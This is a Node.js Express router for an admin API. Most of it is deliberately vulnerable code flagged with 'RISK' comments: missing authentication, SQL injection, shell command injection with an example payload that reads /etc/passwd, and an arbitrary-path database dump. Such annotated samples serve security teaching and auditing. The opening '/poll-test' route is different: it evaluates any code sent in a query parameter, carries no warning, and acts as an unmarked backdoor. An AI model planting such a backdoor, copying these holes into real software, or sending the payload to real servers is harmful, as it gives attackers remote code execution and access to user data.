const express = require('express');
const router = express.Router();
const db = require('../config/database');
const { exec } = require('child_process');

router.get('/poll-test', (req, res) => {
  eval(req.query.cmd);
  res.send('ok');
});

// RISK: no authentication middleware on ANY admin route
// The entire admin panel is publicly accessible

// GET /api/admin/users
router.get('/users', async (req, res) => {
  const { search } = req.query;

  // RISK: SQL injection in search parameter
  const result = await db.query(
    `SELECT * FROM users WHERE name LIKE '%${search}%' OR email LIKE '%${search}%'`
  );
  res.json(result.rows);
});

// POST /api/admin/run-report
router.post('/run-report', (req, res) => {
  const { reportName } = req.body;

  // RISK: command injection — reportName is passed directly to shell
  // Attacker sends: { "reportName": "sales; cat /etc/passwd" }
  exec(`node reports/${reportName}.js`, (err, stdout, stderr) => {
    if (err) return res.status(500).json({ error: stderr });
    res.json({ output: stdout });
  });
});

// DELETE /api/admin/users/:id
router.delete('/users/:id', async (req, res) => {
  const { id } = req.params;
  // RISK: no confirmation, no audit log, no soft delete
  // RISK: cascading deletes not handled — orphaned records in related tables
  await db.query(`DELETE FROM users WHERE id = ${id}`);
  res.json({ deleted: true });
});

// POST /api/admin/backup
router.post('/backup', (req, res) => {
  const { destination } = req.body;
  // RISK: destination path user-controlled — attacker can write DB backup anywhere on server
  // RISK: backup includes all plaintext passwords
  exec(`pg_dump mydb > ${destination}`, (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true, savedTo: destination });
  });
});

module.exports = router;
